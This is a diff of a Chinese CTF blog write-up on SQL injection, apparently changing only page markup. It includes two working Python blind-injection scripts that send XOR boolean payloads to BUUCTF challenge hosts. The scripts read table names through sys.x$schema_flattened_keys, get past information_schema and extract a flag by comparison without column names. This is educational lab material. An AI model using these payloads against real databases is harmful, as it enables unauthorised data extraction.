 <p>获取表名<code>f1ag_1s_h3r3_hhhhh,users233333333333333</code></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://055afa4b-34b4-4c9a-bcab-f1ea5f114242.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema = database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://055afa4b-34b4-4c9a-bcab-f1ea5f114242.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema = database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>
 
 <p>得到了表名了，没找到 既 可以替代information_schema库 且 包含列名信息的库</p>
-<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://644703fe-4b31-43c3-b8c5-9553110650b9.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    letf = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> letf &lt; right:</span><br><span class="line">        s = flag</span><br><span class="line">        mid = (letf+right) // <span class="number">2</span></span><br><span class="line">        s = s + <span class="built_in">chr</span>(mid)</span><br><span class="line">        payload = <span class="string">f&quot;0^((select * from f1ag_1s_h3r3_hhhhh)&gt;(select 1,&#x27;<span class="subst">&#123;s&#125;</span>&#x27;))^0&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        res = requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            letf = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(letf-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
+<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://644703fe-4b31-43c3-b8c5-9553110650b9.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    letf = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> letf &lt; right:</span><br><span class="line">        s = flag</span><br><span class="line">        mid = (letf+right) // <span class="number">2</span></span><br><span class="line">        s = s + <span class="built_in">chr</span>(mid)</span><br><span class="line">        payload = <span class="string">f&quot;0^((select * from f1ag_1s_h3r3_hhhhh)&gt;(select 1,&#x27;<span class="subst">&#123;s&#125;</span>&#x27;))^0&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        res = requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            letf = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(letf-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
 
 <p>核心点：<code>payload = f&quot;0^((select * from f1ag_1s_h3r3_hhhhh)&gt;(select 1,&#39;&#123;s&#125;&#39;))^0&quot;</code></p>
 <p>-&gt; mysql中大于号是按位比较的（见下图），</p>
@@ -759,15 +756,15 @@
 <p>也就是说，最后一次要满足 大于的条件，所以最后要-1</p>
 <p><img lazyload src="/images/loading.svg" data-src="/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4-26-00.png"></p>
 <hr>
-<h4 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/125247898">wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43625917/article/details/104776287">wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160584#h3-16">xor盲注以及其他盲注 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h4 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/125247898">wp<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43625917/article/details/104776287">wp<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160584#h3-16">xor盲注以及其他盲注<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 
-        </div>
+		</div>
 
-        
-            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
     <ul>
         <li><strong>Title:</strong> 二次注入</li>
         <li><strong>Author:</strong> The Redefine Team</li>
@@ -795,66 +792,60 @@
     </ul>
 </div>
 
-            </div>
-        
+		</div>
+		
 
-        
-            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">#漏洞学习</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/Web/">#Web</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">#漏洞学习</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Web/">#Web</a>&nbsp;
+			</li>
+			
+		</ul>
+		
 
-        
+		
 
-        
-            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-                
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/CTF/%E5%B7%A5%E5%85%B7%E6%9D%82%E8%AE%B0/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">工具杂记</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="next"
-                        rel="next"
-                        href="/CTF/Re/Re%E8%AE%B0%E5%BD%95/"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Re刷题记录</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/CTF/%E5%B7%A5%E5%85%B7%E6%9D%82%E8%AE%B0/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">工具杂记</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/CTF/Re/Re%E8%AE%B0%E5%BD%95/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Re刷题记录</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
 
 
-        
-            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-                <div class="comments-container mt-10 w-full ">
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
     <div id="comment-anchor" class="w-full h-2.5"></div>
     <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
         Comments
@@ -894,36 +885,30 @@
     
 </div>
 
-            </div>
-        
-    </div>
+		</div>
+		
+	</div>
 
-    
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">On this page</div>
-        <div class="page-title">二次注入</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Buu-RCTF2015-EasySQL-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">Buu - [RCTF2015]EasySQL [ 二次注入 ]</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%BF%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="nav-number">1.0.1.</span> <span class="nav-text">拿信息：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">1.0.2.</span> <span class="nav-text">分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="nav-number">1.0.3.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number">1.0.4.</span> <span class="nav-text">参考：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPU2019-Web1-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">[SWPU2019]Web1 二次注入题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.二次注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E2%80%94-%E5%9C%A8%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%97%E5%90%8D%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.2.</span> <span class="nav-text">2.无列名注入 — 在不知道列名的情况下进行sql注入.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-bypass-information-schema"><span class="nav-number">2.0.3.</span> <span class="nav-text">3.bypass information_schema</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="nav-number">2.0.4.</span> <span class="nav-text">解题：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk [ php伪协议 二次注入 ]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-Ezsqli-Bypass-information%E5%BA%93-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">[GYCTF2020]Ezsqli [ Bypass information库  偏移注入 ]</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Bypasss-information%E5%BA%93"><span class="nav-number">4.0.1.</span> <span class="nav-text">Bypasss information库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">4.0.2.</span> <span class="nav-text">无列名注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A-1"><span class="nav-number">4.0.3.</span> <span class="nav-text">参考：</span></a></li></ol></li></ol></li></ol>
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">二次注入</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Buu-RCTF2015-EasySQL-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">Buu - [RCTF2015]EasySQL [ 二次注入 ]</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%BF%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="nav-number">1.0.1.</span> <span class="nav-text">拿信息：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">1.0.2.</span> <span class="nav-text">分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="nav-number">1.0.3.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number">1.0.4.</span> <span class="nav-text">参考：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPU2019-Web1-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">[SWPU2019]Web1 二次注入题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.二次注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E2%80%94-%E5%9C%A8%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%97%E5%90%8D%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.2.</span> <span class="nav-text">2.无列名注入 — 在不知道列名的情况下进行sql注入.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-bypass-information-schema"><span class="nav-number">2.0.3.</span> <span class="nav-text">3.bypass information_schema</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="nav-number">2.0.4.</span> <span class="nav-text">解题：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk [ php伪协议 二次注入 ]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-Ezsqli-Bypass-information%E5%BA%93-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">[GYCTF2020]Ezsqli [ Bypass information库  偏移注入 ]</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Bypasss-information%E5%BA%93"><span class="nav-number">4.0.1.</span> <span class="nav-text">Bypasss information库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">4.0.2.</span> <span class="nav-text">无列名注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A-1"><span class="nav-number">4.0.3.</span> <span class="nav-text">参考：</span></a></li></ol></li></ol></li></ol>
 
-    </div>
+	</div>
 </div>
-        </div>
-    
+	</div>
+	
 </div>
+			</div>
 
+			
+		</div>
 
-
-                
-
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
     <div class="info-container py-3 text-center">
         
         <div class="text-center">
@@ -962,7 +947,7 @@
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
             <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
-            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
         </div>
         
         
@@ -991,124 +976,113 @@
         
     </div>  
 </footer>
-        </div>
-    </div>
+		</div>
+	</div>
 
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
 
-        <!-- go comment -->
-        
-            <li class="go-comment">
-                <i class="fa-regular fa-comments"></i>
-            </li>
-        
-    </ul>
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
 </div>
 
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-
-        
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
